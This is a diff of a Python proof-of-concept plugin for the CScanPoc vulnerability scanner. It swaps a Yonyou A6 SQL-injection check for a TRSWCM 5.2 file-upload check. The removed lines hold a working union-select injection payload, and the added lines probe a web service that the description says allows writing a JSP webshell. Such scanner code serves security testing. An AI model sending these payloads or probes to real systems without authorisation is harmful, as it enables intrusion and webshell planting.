@@ -1,29 +1,26 @@
 # coding: utf-8
-import requests
-
-
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 
 class Vuln(ABVuln):
-    vuln_id = 'Yonyou_0101' # 平台漏洞编号，留空
-    name = '用友致远A6协同系统 /isNotInTable.jsp SQL Injection' # 漏洞名称
+    vuln_id = 'TRSWCM_0102' # 平台漏洞编号，留空
+    name = 'TRSWCM 5.2 /wcm/services/ 文件上传漏洞' # 漏洞名称
     level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
-    disclosure_date = '2015-08-31'  # 漏洞公布时间
+    type = VulnType.FILE_UPLOAD # 漏洞类型
+    disclosure_date = '2015-07-29'  # 漏洞公布时间
     desc = '''
-    用友 mysql+jsp 注入
+    TRSWCM的Web Service提供了向服务器写入文件的方式，可以直接写jsp文件获取webshell。
     ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-0110312
+    ref = 'Unknown' # 漏洞来源http://www.wooyun.org/bugs/wooyun-2015-092138
     cnvd_id = 'Unknown' # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
-    product = 'Yonyou'  # 漏洞应用名称
-    product_version = 'Unknown'  # 漏洞应用版本
+    product = 'TRSWCM(拓尔思)'  # 漏洞应用名称
+    product_version = '5.2'  # 漏洞应用版本
 
 
 class Poc(ABPoc):
-    poc_id = '1f9b0911-3a30-40e6-8142-ddd7599f322a' # 平台 POC 编号，留空
+    poc_id = '3ab334d5-def0-44e1-ae93-71be6e75a303' # 平台 POC 编号，留空
     author = 'hyhmnn'  # POC编写者
     create_date = '2018-05-29' # POC创建时间
 
@@ -35,10 +32,10 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                     target=self.target, vuln=self.vuln))
             url = self.target
-            verify_url=('%s/yyoa/ext/trafaxserver/ExtnoManage/isNotInTable.jsp?user_ids='
-                        '(17) union all select md5(3.1415)#') % url
+            payload = '/wcm/services/trs:templateservicefacade?wsdl'
+            verify_url = url + payload
             req = requests.get(verify_url)
-            if req.status_code != 404 and '63e1f04640e83605c1d177544a5a0488' in req.content:
+            if req.status_code == 200 and 'writeFile' in req.content and 'writeSpecFile' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
             
